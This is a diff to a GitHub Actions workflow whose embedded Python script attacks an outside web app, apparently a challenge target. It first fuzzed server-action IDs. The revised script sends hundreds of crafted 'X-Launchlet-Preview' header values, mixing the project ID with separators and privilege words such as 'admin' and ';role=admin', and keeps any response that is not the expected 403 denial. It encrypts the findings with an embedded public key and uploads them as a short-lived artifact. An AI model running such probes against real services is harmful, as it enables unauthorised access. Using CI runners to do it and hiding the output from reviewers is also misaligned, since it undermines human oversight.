@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe action-id prefix and normalization behavior
+      - name: Probe project-prefixed preview context values
         shell: bash
         run: |
           set -euo pipefail
@@ -30,18 +30,25 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json
+          import requests,pathlib,urllib.parse,json,itertools
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; aid=act['id']; url=urllib.parse.urljoin(base,act['endpoint'])
-          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}; args={'workspaceId':boot['workspace'],'projectId':boot['project']}
-          ids=['', 'a','ac','act','act_']+[aid[:i] for i in range(5,len(aid)+1)]
-          ids += [aid+'0',aid+'x',aid+'-export',aid+'_export',aid+'/export',aid.upper(),aid.lower(),aid.strip('act_'),aid[4:], ' '+aid, aid+' ', '\t'+aid, aid+'\t']
-          ids=list(dict.fromkeys(ids)); res=[]
-          for x in ids:
-            r=s.post(url,headers=h,json={'actionId':x,'args':args},timeout=10,allow_redirects=False)
-            res.append({'actionId':x,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          p=boot['project']; args={'workspaceId':boot['workspace'],'projectId':p}; body={'actionId':act['id'],'args':args}; baseh={'Accept':'application/json','Content-Type':'application/json'}
+          suffixes=['preview','deploy','deployment','release','prod','production','enterprise','internal','admin','operator','export','publish','final','final-review','enterprise-rollout','production-readiness','release-pulse','preview-only','preview-8b11c',mf['previewReceipt'],mf['build'],act['id'],refs['runtime'],'preview:deploy','deploy:inspect','preview:deploy:inspect','release:deploy']
+          vals=[p]
+          for sep in [':','/',';','|',',','@','#','?','&','+','.','_','-',' ']:
+            for suf in suffixes:
+              vals += [p+sep+suf,suf+sep+p]
+          vals += [p+'?mode=release',p+'?mode=deploy',p+'?scope=deploy',p+'?scope=deploy:inspect',p+'#release',p+'#deploy',p+';mode=release',p+';role=admin',p+', release',p+',release',p+' release',p+'\trelease']
+          vals=list(dict.fromkeys(vals)); res=[]
+          for v in vals:
+            try:
+              r=s.post(url,headers={**baseh,'X-Launchlet-Preview':v},json=body,timeout=8,allow_redirects=False)
+              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
+                res.append({'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+            except Exception: pass
+          (out/'summary.json').write_text(json.dumps({'count':len(vals),'results':res},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -57,6 +64,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-action-prefix-encrypted
+          name: launchlet-part2-preview-value-encrypted
           path: artifact/
           retention-days: 1
